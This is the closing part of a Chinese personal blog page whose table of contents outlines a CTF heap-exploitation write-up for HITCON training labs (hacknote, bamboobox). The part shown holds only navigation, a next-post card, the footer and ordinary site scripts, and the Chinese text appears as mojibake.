                        <span class="publish-author">
                            
                            <i class="fa fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/CTF/" class="post-category" target="_blank">
                                    CTF
                                </a>
                            
                            
                        </span>
                    </div>
                </div>

                
                <div class="card-action article-tags">
                    
                    <a href="/tags/Pwn/" target="_blank">
                        <span class="chip bg-color">Pwn</span>
                    </a>
                    
                    <a href="/tags/CTF/" target="_blank">
                        <span class="chip bg-color">CTF</span>
                    </a>
                    
                    <a href="/tags/äºŒè¿›åˆ¶å®‰å…¨/" target="_blank">
                        <span class="chip bg-color">äºŒè¿›åˆ¶å®‰å…¨</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">ä¸‹ä¸€ç¯‡</div>
            <div class="card">
                <a href="/2018/11/01/devnullå’Œå¸¸ç”¨linuxå‘½ä»¤é›†/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="/dev/nullå’Œå¸¸ç”¨linuxå‘½ä»¤é›†">
                        
                        <span class="card-title">/dev/nullå’Œå¸¸ç”¨linuxå‘½ä»¤é›†</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary">[TOC]
/dev/null
ğŸ˜­å› ä¸ºå¿˜äº†å‚è€ƒäº†å“ªäº›æ–‡ç« ï¼Œæ‰€ä»¥å¦‚è‹¥æœ‰ä¾µæƒä¹‹å¤„ï¼Œè¿˜è¯·è”ç³»åšä¸»ã€‚

/dev/null ä¸ é‡å®šå‘==&gt; /dev/null æ˜¯linuxç³»ç»Ÿä¸­çš„ä¸€ä¸ªç‰¹æ®Šæ–‡ä»¶è®¾å¤‡ï¼Œä»–çš„ä½œç”¨æ˜¯æ¥å—ä¸€åˆ‡è¾“å…¥å®ƒçš„æ•°æ®å¹¶ä¸¢å¼ƒè¿™äº›</div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="fa fa-clock-o fa-fw icon-date"></i>2018-11-01
                            </span>
                        <span class="publish-author">
                            
                            <i class="fa fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/Linux/" class="post-category" target="_blank">
                                    Linux
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/Linuxé‡å®šå‘/" target="_blank">
                        <span class="chip bg-color">Linuxé‡å®šå‘</span>
                    </a>
                    
                    <a href="/tags/å¸¸ç”¨å‘½ä»¤é›†/" target="_blank">
                        <span class="chip bg-color">å¸¸ç”¨å‘½ä»¤é›†</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>
</div>
    </div>
    <div class="col l3 hide-on-med-and-down">
        <div class="toc-widget">
            <h4>ç›®å½•</h4>
            <div id="toc-content">
                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Pwn-11æœˆ02-Hitcon-å…­"><span class="post-toc-text">Pwn-11æœˆ02-Hitcon-å…­</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#lab10-hacknote"><span class="post-toc-text">lab10-hacknote</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#UAF-use-after-free"><span class="post-toc-text">UAF (use after free)</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#fastbin"><span class="post-toc-text">fastbin</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#æ£€æŸ¥ä¿æŠ¤æªæ–½"><span class="post-toc-text">æ£€æŸ¥ä¿æŠ¤æªæ–½</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#é€»è¾‘åˆ†æ"><span class="post-toc-text">é€»è¾‘åˆ†æ</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#æ„é€ EXP"><span class="post-toc-text">æ„é€ EXP</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#lab11-bamboobox"><span class="post-toc-text">lab11-bamboobox</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#hof-house-of-force"><span class="post-toc-text">hof (house of force)</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#off-by-oneæ¼æ´"><span class="post-toc-text">off_by_oneæ¼æ´</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#unlink"><span class="post-toc-text">unlink</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#æ£€æŸ¥ä¿æŠ¤æªæ–½-1"><span class="post-toc-text">æ£€æŸ¥ä¿æŠ¤æªæ–½</span></a></li></ol></li></ol></li></ol>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        let tocLinks = $('#toc-content a');
        let setTocLinkActive = function (jqObj) {
            tocLinks.removeClass('active');
            jqObj.addClass('active');
        };

        // ç›‘å¬ç‚¹å‡»TOCç›®å½•.
        tocLinks.on('click', function () {
            setTocLinkActive($(this));
        });

        let titleTopArr = [];
        $('#articleContent').find('h1, h2, h3, h4, h5, h6').each(function () {
            titleTopArr.push({'id': $(this).attr('id'), 'top': Math.round($(this).offset().top)});
        });
        let titleLen = titleTopArr.length;

        /* ç›‘å¬æ»šåŠ¨æ¡.*/
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();

            /* add post toc fixed. */
            if (scroll > 240) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }

            /** ä»¥ä¸‹ä»£ç ä¸ºåŠ¨æ€è®¾ç½®TOCæ¿€æ´»é«˜äº®çš„ç›®å½•. */
            if (titleLen === 0) {
                return;
            }

            let firstTitleObj = titleTopArr[0];
            if (firstTitleObj.top > scroll) {
                return;
            } else if (firstTitleObj.top === scroll) {
                setTocLinkActive($('#toc-content a[href="#' + firstTitleObj.id + '"]'));
                return;
            }

            let lastTitleObj = titleTopArr[titleLen - 1];
            if (lastTitleObj.top <= scroll) {
                setTocLinkActive($('#toc-content a[href="#' + lastTitleObj.id + '"]'));
                return;
            }

            for (let i = 0; i < titleLen; i++) {
                if (titleTopArr[i].top > scroll) {
                    setTocLinkActive($('#toc-content a[href="#' + titleTopArr[i - 1].id + '"]'));
                    break;
                }
            }
        });
    });
</script>
    

</main>

<footer class="page-footer bg-color">
    <div class="container row center-align">
        <div class="col s12 m8 l8 copy-right">
            æœ¬ç«™ç”±&copy;<a href="https://yof3ng.github.io/" target="_blank">Yof3ng</a>é‡‡ç”¨
            <a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">hexo-theme-matery</a>çš„ä¸»é¢˜æ­å»º.
        </div>
		
        <div class="col s12 m4 l4 social-link"><a href="https://github.com/yof3ng" class="tooltipped" target="_blank" data-tooltip="è®¿é—®æˆ‘çš„GitHub" data-position="top" data-delay="50">
    <i class="fa fa-github"></i>
</a>
<a href="mailto:yof3ng@gmail.com" class="tooltipped" target="_blank" data-tooltip="é‚®ä»¶è”ç³»æˆ‘" data-position="top" data-delay="50">
    <i class="fa fa-envelope-open"></i>
</a>
<a href="#!" class="tooltipped" data-tooltip="QQè”ç³»æˆ‘: 877153299" data-position="top" data-delay="50">
    <i class="fa fa-qq"></i>
</a>

<a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS è®¢é˜…" data-position="top" data-delay="50">
    <i class="fa fa-rss"></i>
</a>
</div>
			  <a href="http://s11.flagcounter.com/more/zFT">
		<img src="https://s11.flagcounter.com/count/zFT/bg_FFFFFF/txt_000000/border_CCCCCC/columns_4/maxflags_12/viewers_0/labels_1/pageviews_1/flags_0/percent_0/" alt="Flag Counter" border="0"></a>

    </div>
	<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
	<div align=center>
		<span id="busuanzi_container_site_uv">

	</div>
</footer>

<div class="progress-bar"></div>


<!-- æœç´¢é®ç½©æ¡† -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title">æœç´¢</span>
            <input type="search" id="searchInput" name="s" placeholder="è¯·è¾“å…¥æœç´¢çš„å…³é”®å­—"
                   class="search-input" autofocus="">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script src="/js/search.js"></script>
<script type="text/javascript">
    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
</script>
<!-- å›åˆ°é¡¶éƒ¨æŒ‰é’® -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fa fa-angle-double-up"></i>
    </a>
</div>




<script src="/libs/materialize/js/materialize.min.js"></script>
<script src="/libs/masonry/masonry.pkgd.min.js"></script>
<script src="/libs/aos/aos.js"></script>
<script src="/libs/scrollprogress/scrollProgress.min.js"></script>
<script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
<script src="/js/matery.js"></script>
<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
<script type="text/javascript" src="/js/fireworks.js"></script>
<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":100,"height":170},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>